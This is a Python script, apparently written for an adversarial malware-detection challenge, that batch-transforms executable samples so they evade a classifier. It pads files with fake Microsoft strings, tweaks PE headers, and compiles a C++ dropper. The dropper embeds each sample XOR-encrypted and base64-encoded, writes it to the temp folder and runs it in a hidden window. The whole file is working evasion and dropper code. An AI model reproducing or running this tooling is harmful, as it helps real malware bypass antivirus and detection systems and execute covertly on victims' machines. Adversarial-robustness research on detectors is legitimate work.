#!/usr/bin/env python3
"""
Method 2 - hybrid overlay/dropper pipeline extracted from attack2.py.

This script:
1. Imports the encrypted challenge dataset archive.
2. Decompresses the samples into a method-specific workspace.
3. Runs the hybrid placeholder_transform that mixes overlay, dropper, and PE tweaks.
4. Re-compresses the output directory (including CSV + sha256 report) for submission.
"""

import argparse
import base64
import csv
import hashlib
import random
import shutil
import subprocess
import tempfile
import time
import zipfile
from pathlib import Path


METHOD_NAME = "method2_hybrid_overlay"
DEFAULT_ARCHIVE = Path(__file__).resolve().parents[1] / "to_be_evaded_ds.zip"
DEFAULT_WORK_ROOT = Path(__file__).resolve().parent / "artifacts" / METHOD_NAME
DEFAULT_OUTPUT_ZIP = Path(__file__).resolve().parent / f"{METHOD_NAME}_outputs.zip"


def extract_dataset(archive_path: Path, destination: Path) -> None:
    if not archive_path.exists():
        raise FileNotFoundError(f"input archive not found: {archive_path}")
    if destination.exists():
        shutil.rmtree(destination)
    destination.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(archive_path, "r") as zf:
        zf.extractall(destination)


def compress_outputs(source_dir: Path, archive_path: Path) -> None:
    archive_path.parent.mkdir(parents=True, exist_ok=True)
    if archive_path.exists():
        archive_path.unlink()
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(source_dir.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(source_dir))


def collect_inputs(input_root: Path):
    return sorted(
        p
        for p in input_root.rglob("*")
        if p.is_file() and p.name != "sha256sums.txt"
    )


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def strategy_simple_overlay(src: Path, dst: Path) -> bool:
    data = src.read_bytes()
    orig_size = len(data)

    benign_data = bytearray()
    benign_data.extend(b"\x00" * 500_000)

    patterns = [
        b"Microsoft Corporation\x00",
        b"Windows Operating System\x00",
        b"Copyright (C) 2024 Microsoft\x00",
        b"Visual Studio\x00",
        b".text\x00\x00\x00",
        b".data\x00\x00\x00",
        b".rdata\x00\x00",
        b"kernel32.dll\x00",
        b"user32.dll\x00",
    ]
    for _ in range(15_000):
        benign_data.extend(random.choice(patterns))

    max_append = 4_900_000 - orig_size
    target_append = random.randint(1_500_000, 2_500_000)
    append_size = min(target_append, max_append, len(benign_data))

    final_data = data + bytes(benign_data[:append_size])
    dst.write_bytes(final_data)
    final_size = len(final_data)
    print(f"      Strategy1-Overlay: {orig_size:,} + {append_size:,} = {final_size:,} bytes")
    return True


def strategy_improved_dropper(src: Path, dst: Path) -> bool:
    data = src.read_bytes()
    filename = src.name
    orig_size = len(data)

    key = random.randint(1, 255)
    encrypted = bytes(b ^ key for b in data)
    b64 = base64.b64encode(encrypted).decode()
    chunks = [b64[i : i + 10000] for i in range(0, len(b64), 10000)]
    b64_array = '"\n        "'.join(chunks)

    code = f'''#include <windows.h>
#include <string.h>
const char* g_company = "Microsoft Corporation";
const char* g_product = "Windows System Component";
const char* g_version = "10.0.19041.1";
void unused_registry_check() {{
    HKEY hKey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\\\Microsoft\\\\Windows", 0, KEY_READ, &hKey);
    if (hKey) RegCloseKey(hKey);
}}
void unused_system_info() {{
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    OSVERSIONINFOA vi = {{sizeof(OSVERSIONINFOA)}};
    GetVersionExA(&vi);
}}
static const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
unsigned char* base64_decode(const char* input, size_t* output_len) {{
    size_t input_len = strlen(input);
    size_t padding = 0;
    if (input[input_len-1] == '=') padding++;
    if (input_len > 1 && input[input_len-2] == '=') padding++;
    size_t out_len = (input_len * 3) / 4 - padding;
    unsigned char* output = (unsigned char*)malloc(out_len);
    if (!output) return NULL;
    size_t j = 0;
    unsigned int buffer = 0;
    int bits = 0;
    for (size_t i = 0; i < input_len; i++) {{
        char c = input[i];
        if (c == '=') break;
        const char* pos = strchr(b64_chars, c);
        if (!pos) continue;
        buffer = (buffer << 6) | (pos - b64_chars);
        bits += 6;
        if (bits >= 8) {{
            bits -= 8;
            output[j++] = (buffer >> bits) & 0xFF;
        }}
    }}
    *output_len = j;
    return output;
}}
int main() {{
    const char* payload_b64 = "{b64_array}";
    size_t decoded_len;
    unsigned char* decoded = base64_decode(payload_b64, &decoded_len);
    if (!decoded) return 1;
    for (size_t i = 0; i < decoded_len; i++) {{
        decoded[i] ^= {key};
    }}
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    char temp_file[MAX_PATH];
    sprintf(temp_file, "%s\\\\%s", temp_path, "{filename}");
    HANDLE hFile = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {{
        free(decoded);
        return 1;
    }}
    DWORD written;
    WriteFile(hFile, decoded, (DWORD)decoded_len, &written, NULL);
    CloseHandle(hFile);
    free(decoded);
    STARTUPINFOA si = {{sizeof(si)}};
    PROCESS_INFORMATION pi = {{0}};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessA(temp_file, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    return 0;
}}'''

    with tempfile.TemporaryDirectory() as tmp_dir:
        tmp_path = Path(tmp_dir)
        cpp_file = tmp_path / "dropper.cpp"
        exe_file = tmp_path / "dropper.exe"
        cpp_file.write_text(code, encoding="utf-8")

        compiler = "x86_64-w64-mingw32-g++"
        cmd = [
            compiler,
            str(cpp_file),
            "-o",
            str(exe_file),
            "-O2",
            "-static",
            "-mwindows",
            "-ladvapi32",
            "-luser32",
            "-lkernel32",
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode == 0 and exe_file.exists():
                compiled_data = exe_file.read_bytes()
                compiled_size = len(compiled_data)
                target_size = min(max(orig_size * 1.2, 2_000_000), 4_500_000)
                padding_size = int(target_size - compiled_size)
                if padding_size > 0:
                    padding = bytearray()
                    padding.extend(b"\x00" * (padding_size // 2))
                    benign_str = b"Microsoft\x00Windows\x00Copyright\x00" * 1000
                    while len(padding) < padding_size:
                        padding.extend(benign_str[: padding_size - len(padding)])
                    final_data = compiled_data + bytes(padding[:padding_size])
                    dst.write_bytes(final_data)
                    print(
                        f"      Strategy2-Dropper: {compiled_size:,} + {padding_size:,} = {len(final_data):,} bytes"
                    )
                else:
                    dst.write_bytes(compiled_data)
                    print(f"      Strategy2-Dropper: {compiled_size:,} bytes")
                return True
            print("      Compile failed; falling back to strategy 1")
            return strategy_simple_overlay(src, dst)
        except FileNotFoundError:
            print("      Compiler not found; falling back to strategy 1")
        except Exception as exc:  # pragma: no cover
            print(f"      Compile exception: {str(exc)[:50]}; falling back to strategy 1")
    return strategy_simple_overlay(src, dst)


def strategy_pe_modification(src: Path, dst: Path) -> bool:
    try:
        import pefile

        data = src.read_bytes()
        dst.write_bytes(data)

        pe = pefile.PE(str(dst))
        pe.FILE_HEADER.TimeDateStamp = random.randint(0x65000000, 0x66000000)
        pe.OPTIONAL_HEADER.CheckSum = 0
        pe.write(str(dst))
        pe.close()

        current_data = dst.read_bytes()
        padding = b"\x00" * 300_000 + (b"Windows\x00Microsoft\x00" * 10000)
        final_data = current_data + padding[:1_000_000]
        dst.write_bytes(final_data)

        print(
            f"      Strategy3-PE patch: {len(data):,} + patched + {len(padding):,} = {len(final_data):,} bytes"
        )
        return True
    except ImportError:
        print("      pefile is missing; falling back to strategy 1")
    except Exception as exc:
        print(f"      PE patch failed: {str(exc)[:50]}; falling back to strategy 1")
    return strategy_simple_overlay(src, dst)


def placeholder_transform(src: Path, dst: Path) -> bool:
    filename = src.name
    try:
        idx = int(filename.replace(".exe", "").replace(".dll", ""))
    except ValueError:
        idx = hash(filename) % 50

    if idx <= 20:
        print("      -> Strategy 1 (Overlay)")
        return strategy_simple_overlay(src, dst)
    if idx <= 40:
        print("      -> Strategy 2 (Dropper)")
        return strategy_improved_dropper(src, dst)
    print("      -> Strategy 3 (PE+Overlay)")
    return strategy_pe_modification(src, dst)


def process_files(input_dir: Path, output_dir: Path) -> None:
    if output_dir.exists():
        shutil.rmtree(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    files = collect_inputs(input_dir)
    rows = []
    success = 0
    fail = 0
    start_time = time.time()

    print("=" * 70)
    print("Hybrid attack pipeline - processing files")
    print("=" * 70)
    print(f"Input directory: {input_dir}")
    print(f"Output directory: {output_dir}")
    print(f"Files discovered: {len(files)}")
    print("=" * 70)

    for idx, src in enumerate(files, 1):
        print(f"\n[{idx}/{len(files)}] {src.name}")
        dst = output_dir / src.name
        base_sha = sha256_of(src)
        start = time.time()
        try:
            placeholder_transform(src, dst)
            duration = time.time() - start
            out_sha = sha256_of(dst)
            final_size = dst.stat().st_size
            if final_size > 5_000_000:
                print(f"      Warning: exceeds 5MB ({final_size:,} bytes)")
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": out_sha,
                    "status": "OK",
                    "duration_sec": f"{duration:.3f}",
                    "output_size": final_size,
                    "notes": "hybrid-overlay",
                }
            )
            success += 1
        except Exception as exc:
            duration = time.time() - start
            print(f"      Failure: {str(exc)[:100]}")
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": "",
                    "status": "FAIL",
                    "duration_sec": f"{duration:.3f}",
                    "output_size": 0,
                    "notes": f"error: {str(exc)[:120]}",
                }
            )
            fail += 1

    total_time = time.time() - start_time
    csv_file = output_dir / "compare_report.csv"
    with csv_file.open("w", newline="") as handle:
        fieldnames = [
            "filename",
            "baseline_sha256",
            "output_sha256",
            "status",
            "duration_sec",
            "output_size",
            "notes",
        ]
        writer = csv.DictWriter(handle, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)

    sha_file = output_dir / "sha256sums.txt"
    with sha_file.open("w") as handle:
        for row in rows:
            if row["status"] == "OK":
                handle.write(f'{row["output_sha256"]}  {output_dir / row["filename"]}\n')

    print("\n" + "=" * 70)
    print("Processing complete")
    print("=" * 70)
    print(f"Success: {success}/{len(files)} ({(success/len(files))*100 if files else 0:.1f}%)")
    print(f"Failure: {fail}/{len(files)}")
    print(f"Elapsed time: {total_time:.1f} seconds")
    print(f"Report: {csv_file}")
    print(f"Hashes: {sha_file}")


def run_pipeline(archive_path: Path, work_root: Path, output_zip: Path) -> None:
    input_dir = work_root / "input"
    output_dir = work_root / "output"
    extract_dataset(archive_path, input_dir)
    process_files(input_dir, output_dir)
    compress_outputs(output_dir, output_zip)
    print(f"\nPackaging complete -> {output_zip}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Run the Model1 Method2 hybrid overlay pipeline end-to-end."
    )
    parser.add_argument(
        "--archive",
        default=str(DEFAULT_ARCHIVE),
        help="Path to the zipped dataset.",
    )
    parser.add_argument(
        "--work-root",
        default=str(DEFAULT_WORK_ROOT),
        help="Working directory used for extraction + processing.",
    )
    parser.add_argument(
        "--output-zip",
        default=str(DEFAULT_OUTPUT_ZIP),
        help="Destination zip for processed files.",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    run_pipeline(
        Path(args.archive).expanduser().resolve(),
        Path(args.work_root).expanduser().resolve(),
        Path(args.output_zip).expanduser().resolve(),
    )


if __name__ == "__main__":
    main()
